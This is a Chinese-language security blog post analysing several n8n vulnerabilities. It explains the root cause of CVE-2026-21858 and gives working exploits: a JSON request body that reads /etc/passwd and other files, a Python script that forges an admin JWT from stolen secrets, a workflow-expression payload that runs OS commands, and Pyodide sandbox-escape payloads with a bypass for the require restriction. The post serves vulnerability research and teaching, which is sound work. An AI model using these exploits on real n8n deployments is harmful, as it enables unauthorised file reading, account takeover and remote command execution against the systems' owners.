+<h1 id="CVE-2026-21858-未授权任意文件读取"><a href="#CVE-2026-21858-未授权任意文件读取" class="headerlink" title="CVE-2026-21858 未授权任意文件读取"></a>CVE-2026-21858 未授权任意文件读取</h1><p>关于配置项可以查阅文档，实际参数采用驼峰命名法： <a target="_blank" rel="noopener" href="https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.formtrigger/#form-description">https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.formtrigger/#form-description</a></p>
+<p>前提：目标必须具有带有文件上传字段的的表单工作流，有回显，最好已知对应的 webhook api</p>
+<p>易受攻击的配置文件：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"nodes"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Form Trigger"</span><span class="token punctuation">,</span>
+      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"n8n-nodes-base.formTrigger"</span><span class="token punctuation">,</span>
+      <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">"responseMode"</span><span class="token operator">:</span> <span class="token string">"responseNode"</span><span class="token punctuation">,</span>
+        <span class="token property">"formFields"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+          <span class="token property">"values"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span> <span class="token property">"fieldLabel"</span><span class="token operator">:</span> <span class="token string">"document"</span><span class="token punctuation">,</span> <span class="token property">"fieldType"</span><span class="token operator">:</span> <span class="token string">"file"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Respond"</span><span class="token punctuation">,</span>
+      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"n8n-nodes-base.respondToWebhook"</span><span class="token punctuation">,</span>
+      <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">"respondWith"</span><span class="token operator">:</span> <span class="token string">"binary"</span><span class="token punctuation">,</span>
+        <span class="token property">"inputDataFieldName"</span><span class="token operator">:</span> <span class="token string">"document"</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token property">"connections"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">"Form Trigger"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"main"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span> <span class="token property">"node"</span><span class="token operator">:</span> <span class="token string">"Respond"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先是文件上传</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204154128785.png"></p>
+<h2 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h2><p>在 n8n 中，Webhook 作为工作流的起点，可以捕获来自表单、聊天消息、WhatsApp 通知等传入的数据，然后会经过中间件 parseRequestBody 处理</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204155148381.png"></p>
+<p>此处对 multipart 包使用 <code>parseFormData</code> 进行解析而其他 contentType 则使用 <code>parseBody</code> 进行解析，<code>parseBody</code> 在解析 json 后会把键值对添加到全局的 req.body 中</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204155419965.png"></p>
+<p>而文件上传的 multipart 包在解析后会经过 Formidable 库处理，通常情况 Formidable 库处理后会将上传的文件保存到临时目录下的随机路径</p>
+<p>但是 n8n 的文件上传解析器这里实际上是封装了 Formidable 库的 parse() 函数，解析后会将 Formidable 库的输出填充进 req.body，于是就会出现一个问题</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204160100710.png"></p>
+<p>很明显如果在调用了文件上传解析器的情况下又使用了 parseBody 来解析 json 里的键值对，就可以导致变量覆盖</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204160325333.png"></p>
+<p>而这个问题确实存在于 n8n 的工作流程中： <a target="_blank" rel="noopener" href="https://github.com/n8n-io/n8n/commit/c8d604d2c466dd84ec24f4f092183d86e43f2518">https://github.com/n8n-io/n8n/commit/c8d604d2c466dd84ec24f4f092183d86e43f2518</a></p>
+<p>提交表单使用 <code>formwebhook</code>，它会调用 <code>prepareFormReturnItem</code>，最终会调用下面这段</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> data<span class="token punctuation">,</span> files <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">const</span> <span class="token literal-property property">processFiles</span><span class="token operator">:</span> MultiPartFormData<span class="token punctuation">.</span>File<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">let</span> multiFile <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		processFiles<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		multiFile <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		processFiles<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">let</span> fileCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> file <span class="token keyword">of</span> processFiles<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">let</span> binaryPropertyName <span class="token operator">=</span> key<span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>binaryPropertyName<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			binaryPropertyName <span class="token operator">=</span> binaryPropertyName<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>multiFile<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			binaryPropertyName <span class="token operator">+=</span> fileCount<span class="token operator">++</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>binaryPropertyName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			binaryPropertyName <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>options<span class="token punctuation">.</span>binaryPropertyName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>count<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		returnItem<span class="token punctuation">.</span>binary<span class="token operator">!</span><span class="token punctuation">[</span>binaryPropertyName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span>nodeHelpers<span class="token punctuation">.</span><span class="token function">copyBinaryFile</span><span class="token punctuation">(</span>
+			file<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span>
+			file<span class="token punctuation">.</span>originalFilename <span class="token operator">??</span> file<span class="token punctuation">.</span>newFilename<span class="token punctuation">,</span>
+			file<span class="token punctuation">.</span>mimetype<span class="token punctuation">,</span>
+		<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		<span class="token comment">// Delete original file to prevent tmp directory from growing too large</span>
+		<span class="token keyword">await</span> <span class="token function">rm</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">force</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		count <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>copyBinaryFile 会调用 req.body.files 把文件从指定的文件路径复制到持久存储</p>
+<p>而这一过程没有验证是否为 multipart&#x2F;form-data，因此我们可以用 json 控制其 filepath，于是这个 api 一旦会回显文件内容，我们可以指定 filepath 为本地路径从而实现任意文件读取</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>文件上传，抓包修改 multipart 包为 json 请求体</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/form/vulnerable-form</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:5678</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br, zstd</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:5678/form/vulnerable-form</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:5678</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">419</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
+<span class="token application-json">
+<span class="token punctuation">&#123;</span>
+    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">"field-0"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+            <span class="token property">"filepath"</span><span class="token operator">:</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span>
+            <span class="token property">"originalFilename"</span><span class="token operator">:</span> <span class="token string">"1.pdf"</span><span class="token punctuation">,</span>
+            <span class="token property">"mimetype"</span><span class="token operator">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span>
+            <span class="token property">"extension"</span><span class="token operator">:</span> <span class="token string">""</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204154637463.png"></p>
+<p>实现了任意文件读取</p>
+<hr>
+<h2 id="进一步利用，登录-admin"><a href="#进一步利用，登录-admin" class="headerlink" title="进一步利用，登录 admin"></a>进一步利用，登录 admin</h2><p>n8n 将 session 存储在一个名为 <code>n8n-auth</code> 的 cookie 中，以 jwt HS256 加密这个 body：</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204170744345.png"></p>
+<p>所以我们需要读取相关文件，拿到 id，email，password_hash 和 secret_key，对于 docker 起到 n8n，前三者在 <code>$HOME/.n8n/database.sqlite</code> 这个数据库里，key 在 <code>$HOME/.n8n/config</code></p>
+<p>先查看当前用户目录</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204171658000.png"></p>
+<p>然后读取对应内容</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204172035780.png"></p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204172051181.png"></p>
+<p>接下来生成 jwt</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> jwt
+
+
+<span class="token keyword">def</span> <span class="token function">forge_token</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> uid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> email<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> pw_hash<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    secret <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    h <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>
+        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pw_hash<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
+    admin_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> uid<span class="token punctuation">,</span> <span class="token string">"hash"</span><span class="token punctuation">:</span> h<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token string">"HS256"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> admin_token
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>
+    forge_token<span class="token punctuation">(</span>
+        <span class="token string">"jpmCgd+nc7oTbAlnxPStjptYBmAxYOAV"</span><span class="token punctuation">,</span>
+        <span class="token string">"0121c327-fdce-4a0a-a6c1-38b3bf6bb617"</span><span class="token punctuation">,</span> <span class="token string">"admin@exploit.local"</span><span class="token punctuation">,</span>
+        <span class="token string">"$2a$10$InghmOrG5qXvBZ1FupblleSjxvM0L520sU3BFMxTxq9NLN.FQvO7e"</span>
+    <span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjAxMjFjMzI3LWZkY2UtNGEwYS1hNmMxLTM4YjNiZjZiYjYxNyIsImhhc2giOiJjTkdQUFhlZzRXIn0.mLSYi6FNf9ZcDmWdF1TEsHYTTTEnjYsQyJO-DaPLgyw </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就能访问了</p>
+<hr>
+<h1 id="CVE-2025-68613-RCE"><a href="#CVE-2025-68613-RCE" class="headerlink" title="CVE-2025-68613 RCE"></a>CVE-2025-68613 RCE</h1><p>进入后台后，新建 workflow</p>
+<p>添加 “Manual Trigger” 节点，添加 “Set” 节点，连接它们</p>
+<p>然后进入 Set 节点的设置，添加 String value，name 取名为 result，使用 expression 模式，然后打入 payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205110312525.png"></p>
+<p>然后执行 test step</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205110448615.png"></p>
+<p>成功命令执行</p>
+<hr>
+<h1 id="CVE-2025-68668-Pyodide-沙箱逃逸"><a href="#CVE-2025-68668-Pyodide-沙箱逃逸" class="headerlink" title="CVE-2025-68668 Pyodide 沙箱逃逸"></a>CVE-2025-68668 Pyodide 沙箱逃逸</h1><p>n8n 中提供了一个 Code 节点可以在沙盒内执行 Javascript&#x2F;Python 代码，其中 Python 沙盒是基于 Pyodide 实现的</p>
+<p>依旧需要后台权限</p>
+<p>漏洞影响：1.0.0 &lt;&#x3D; n8n &lt; 2.0.0</p>
+<p>在 Pyodide 中运行的 Python 代码通过 JavaScript Bridge 跨越沙箱边界。通过该桥接器，将调用未受限的 Node.js API，这些 API 提供对进程管理和文件系统操作等模块的访问。因此，攻击者能够以 n8n 进程的权限执行任意操作系统命令。</p>
+<p>创建一个新的 Workflow 并添加一个 Python 代码节点。当前环境中对沙箱进行了加固，限制对 <code>require</code> 的直接调用。使用文章中的 <a target="_blank" rel="noopener" href="https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n">poc</a> 进行验证，将报错 <code>ReferenceError: require is not defined</code>：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> js <span class="token keyword">import</span> require
+
+child_process <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>
+output <span class="token operator">=</span> child_process<span class="token punctuation">.</span>execSync<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> output<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205112238790.png"></p>
+<p>但是对于 CTFer 而言要绕过这个 require 还是太轻松了，直接用 <code>process.mainModule</code> 就行了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> js
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    output <span class="token operator">=</span> js<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'process.mainModule.require("child_process").execSync("id").toString()'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> output<span class="token punctuation">&#125;</span>
+<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们还可以用 <code>process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()</code> 使 payload 里完全不出现 require</p>
+<p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205112739318.png"></p>
+<hr>
+<h1 id="CVE-2026-21877-任意文件写入-RCE"><a href="#CVE-2026-21877-任意文件写入-RCE" class="headerlink" title="CVE-2026-21877 任意文件写入 RCE"></a>CVE-2026-21877 任意文件写入 RCE</h1><p>漏洞影响： 0.123.0 &lt;&#x3D; n8n &lt; 1.121.3</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ashwesker/Ashwesker-CVE-2026-21877">https://github.com/Ashwesker/Ashwesker-CVE-2026-21877</a></p>
+<p>作者删库了</p>
+<p>只能看看这里的修复方法——管理员可以通过禁用 Git 节点并限制不受信任用户的访问权限</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+      </div>
+    </transition>
+    
+    <transition name="fade">
+      <div id="preview" ref="preview" v-show="previewShow">
+        <img id="preview-content" ref="previewContent" />
+      </div>
+    </transition>
+    
+  </div>
+  <script src="/blog/js/main.js"></script>
+  
+  
+
+
+
+
+  
+  
+
+<div id="vcomments"></div>
+<script defer src="/blog/js/lib/valine.min.js" onload="
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+"></script>
+
+
+  <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
